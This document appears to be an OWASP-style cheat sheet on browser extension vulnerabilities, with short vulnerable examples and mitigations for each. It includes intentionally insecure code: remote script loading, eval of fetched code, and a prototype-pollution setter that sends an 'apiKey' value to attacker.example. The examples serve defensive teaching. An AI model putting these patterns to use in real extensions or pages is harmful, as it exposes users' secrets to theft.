# Browser Extension Security Vulnerabilities Cheat Sheet

## 1. Permissions Overreach

### Vulnerability: Permissions Overreach

Browser extensions sometimes request more permissions than they actually need. This can grant them access to all tabs, browsing history, and even sensitive user data. If an extension is compromised, it could lead to serious privacy risks.

### Example: Permissions Overreach

```json
{
  "manifest_version": 3,
  "name": "My Extension",
  "permissions": [
    "tabs",
    "http://*/*",
    "https://*/*",
    "storage"
  ]
}
```

### Mitigation: Permissions Overreach

Follow the Principle of Least Privilege (PoLP) and request only the permissions that are absolutely necessary. Use optional permissions whenever possible instead of granting full access upfront. Regularly audit and remove any permissions that are no longer needed.

## 2. Data Leakage

### Vulnerability: Data Leakage

Some extensions unintentionally expose user data by sending browsing activity or personal details to external servers without proper security measures.

### Example: Data Leakage

```javascript
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete') {
    fetch('http://example.com/track', {
      method: 'POST',
      body: JSON.stringify({ URL: tab.URL })
    });
  }
});
```

### Mitigation: Data Leakage

Always use HTTPS for all communications to prevent data interception. Limit data collection and be transparent by clearly stating what data is collected in a Privacy Policy.Implement user consent mechanisms before collecting or sending any personal data.

## 3. Cross-Site Scripting (XSS)

### Vulnerability: Cross-Site Scripting (XSS)

If user input is not properly sanitized, attackers can inject malicious scripts into web pages, potentially stealing user data or performing unauthorized actions.

### Example: Cross-Site Scripting (XSS)

```javascript
let userInput = document.getElementById('input').value;
document.getElementById('output').innerHTML = userInput; // No sanitization
```

### Mitigation: Cross-Site Scripting (XSS)

Implement Content Security Policy (CSP) to block inline scripts. Use libraries like DOMPurify to sanitize user input before displaying it. Avoid using innerHTML and instead use textContent to prevent execution of injected scripts.

## 4. Insecure Communication

### Vulnerability: Insecure Communication

Some extensions send sensitive data over unsecured HTTP connections, making it vulnerable to interception by attackers.

### Example: Insecure Communication

```javascript
fetch('http://example.com/api/data');
```

### Mitigation: Insecure Communication

Always use HTTPS for external communications to prevent data theft. Validate server responses before processing them to ensure data integrity.

## 5. Code Injection

### Vulnerability: Code Injection

An extension that dynamically loads scripts from an untrusted source can be exploited to inject and execute malicious code.

### Example: Code Injection

```javascript
let script = document.createElement('script');
script.src = 'http://example.com/malicious.js';
document.body.appendChild(script);
```

### Mitigation: Code Injection

Use CSP (Content Security Policy) to restrict script sources. For more details, refer to the [CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html). Avoid using eval() and innerHTML as they can execute malicious code. Prefer using extension messaging APIs instead of injecting scripts into web pages.

## 6. Malicious Updates

### Vulnerability: Malicious Updates

If an extension fetches updates from an untrusted server, an attacker could push malicious updates to all users.

### Example: Malicious Updates

```javascript
chrome.runtime.onInstalled.addListener(() => {
  fetch('http://example.com/update-script.js')
    .then(response => response.text())
    .then(eval); // Unsafe!
});
```

### Mitigation: Malicious Updates

Sign extension updates with digital signatures to ensure authenticity. Instead of fetching updates within the extension, rely on updates from the extension marketplace.
See ["Don’t inject or incorporate remote scripts"](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Security_best_practices).
Implement integrity checks before executing any fetched code.

## 7. Third-Party Dependencies

### Vulnerability: Third-Party Dependencies

Using outdated or vulnerable third-party libraries in an extension can introduce security risks if those libraries have known exploits.

### Example: Third-Party Dependencies

```json
{
  "dependencies": {
    "vulnerable-lib": "1.0.0"
  }
}
```

### Mitigation: Third-Party Dependencies

Regularly audit third-party dependencies for security vulnerabilities. Use tools like npm audit or OWASP Dependency-Check to detect risks.Prefer actively maintained libraries with frequent security updates.

## 8. Lack of Content Security Policy (CSP)

### Vulnerability: Lack of Content Security Policy (CSP)

Without a strict CSP, attackers can inject scripts into an extension’s web pages, increasing the risk of cross-site scripting (XSS) attacks.

### Example: Lack of Content Security Policy (CSP)

```json
{
  "manifest_version": 3,
  "name": "My Extension",
  "content_security_policy": "default-src 'self'"
}
```

### Mitigation: Lack of Content Security Policy (CSP)

Define a strict CSP in the extension’s manifest.json file. Use nonce-based or hash-based policies to allow only trusted scripts. Block execution of inline scripts and restrict third-party content sources.

## 9. Insecure Storage

### Vulnerability: Insecure Storage

Storing sensitive data like authentication tokens in localStorage or other unsecured locations makes it easy for attackers to access.

### Example: Insecure Storage

```javascript
localStorage.setItem('token', 'my-secret-token'); // No encryption
```

### Mitigation: Insecure Storage

Store sensitive data in Chrome Storage API, which provides better security than localStorage.
Encrypt stored data before saving it locally.
Never hardcode API keys or credentials within the extension code.

## 10. Insufficient Privacy Controls

### Vulnerability: Insufficient Privacy Controls

If an extension does not clearly define how it collects and handles user data, it could lead to privacy violations and unauthorized data usage.

### Example: Insufficient Privacy Controls

```json
{
  "manifest_version": 3,
  "name": "My Extension",
  "description": "A cool extension with no privacy policy."
}
```

### Mitigation: Insufficient Privacy Controls

Implement a clear privacy policy that explains data collection practices. Allow users to opt out of data collection. Disclose data-sharing practices to comply with GDPR, CCPA, and other privacy regulations.

## 11. DOM-based Data Skimming

### Vulnerability: DOM-based Data Skimming

When an extension renders sensitive user information directly into DOM of a web page, this data becomes accessible to the page's own scripts.

This risk applies regardless of the method used, including plain JavaScript DOM manipulation or injecting components built with frameworks like React.

A malicious or compromised web page can inspect the DOM, read the sensitive data (e.g., personally identifiable information, financial details, AI chat histories), and exfiltrate it.

### Example: DOM-based Data Skimming

```javascript
// content-script.js

// Sensitive data fetched from the extension's background service
const userData = {
  name: "Jane Doe",
  email: "jane.doe@example.com"
};

// This injects sensitive data directly into the page's DOM
const userInfoDiv = document.createElement('div');
userInfoDiv.innerText = `name: ${userData.name}, email: ${userData.email}`;
document.body.appendChild(userInfoDiv);
```

### Mitigation: DOM-based Data Skimming

Avoid rendering any sensitive information directly into a web page's DOM. Instead, display sensitive data in UI elements that are isolated from the web page's context and controlled by the extension.

Use secure alternatives such as:

- Popup: Display information in a popup UI that appears when the user clicks the extension's icon.
- Options Page: Use a dedicated options page for displaying user-specific data or settings.
- Side Panel: Use the side panel to show a persistent UI in a separate pane, isolated from the page content. (FYI, "Side Panel" is a Chromium term. Firefox calls it "Sidebar".)

It is important to note that even using a Shadow DOM for encapsulation may not be a sufficient safeguard, as page scripts can still query an 'open' Shadow DOM. Moreover, even a 'closed' Shadow DOM is not safe, if you consider other browser extensions as threats under your security model. This is because extensions can spear through a 'closed' Shadow DOM using [`openOrClosedShadowRoot()` API](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/dom/openOrClosedShadowRoot).

Therefore, using truly separate extension-controlled UIs is the most reliable mitigation.

## 12. Prototype-based Data Skimming

### Vulnerability: Prototype-based Data Skimming

An extension's content script is executed in "isolated world", a JavaScript context separated from the one of a web page. On the other hand, there are some ways for an extension to execute scripts in "main world", a web page's context. For example, an extension can inject a `<script>` tag directly to DOM with `src` attribute pointing to a script of [web accessible resources](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/manifest.json/web_accessible_resources).

When an extension uses sensitive user information in any scripts executed on the web page's context, the data becomes accessible to the page's scripts. So, if the web page is compromised or malicious, the data will be stolen.

The reason why the data becomes accessible is because global objects of a context (sometimes called "built-in objects", "primordials" or "prototypes") can be overwritten to behave differently than usual. This is known as "prototype pollution", "prototype overriding" and so on.

This means that a malicious or compromised webpage can overwrite global objects in its context to steal any data they handle. Please note that objects here include almost everything in the context such as functions. So, if the extension's injected script uses these overwritten objects with sensitive data, it will inadvertently trigger the malicious code, leading to the exfiltration of that data.

### Example: Prototype-based Data Skimming

```javascript
// Malicious script overwriting all objects' setter for 'apiKey'
// to send the value to be set towards a server.
Object.defineProperty(Object.prototype, 'apiKey', {
    set: function (str) {
        fetch(`https://attacker.example?data=${str}`);
        Object.defineProperty(this, 'apiKey', {
            value: str
        })
        return str
    }
})

// Extension's script to be executed on a web page's context.
window.addEventListener('message', (data) => {
  if (data.apiKey) {
    // the setter for 'apiKey' is already polluted,
    // and the below line triggers malicious code and the data is immediately sent.
    window.apiController.apiKey = data.apiKey;
  }
})
```

### Mitigation: Prototype-based Data Skimming

Please don't use the web page's context when sensitive user information is handled just for a moment. If communication with scripts in the web page's context is necessary, use only non-sensitive, essential information. For example, pass just a result of validation instead of the whole secret token. It's the case even if you use `window.postMessage`, because it can be overwritten also and malicious scripts can add listeners for `message` event.

Please note that it's not recommended to try to get native (not-overwritten) prototypes by some tricks. It's sure that there are some hacks to get native prototypes in a context where other scripts are also executed, but bypasses of these measures, i.e. how to force other scripts to use overwritten prototypes, are often invented.

Also, please don't assume your extension's script can use native prototypes even if it's executed at `document_start` timing. At least, in the case of Chromium browser extension, it's known that the context of a newly created iframe can be tweaked by a web page's script BEFORE the extension's script starts in the iframe event at `document_start` ([official bug issue](https://issues.chromium.org/issues/40202434)).

## Conclusion

By following these security best practices, developers can build safer browser extensions and protect users from privacy and security threats. Always prioritize least privilege, encryption, and secure coding principles when developing extensions.

🔹 References:
[Google Chrome Extension Security Guide](https://developer.chrome.com/docs/extensions/mv3/security/)  
[Mozilla Firefox Extension Security Best Practices](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Security_best_practices)
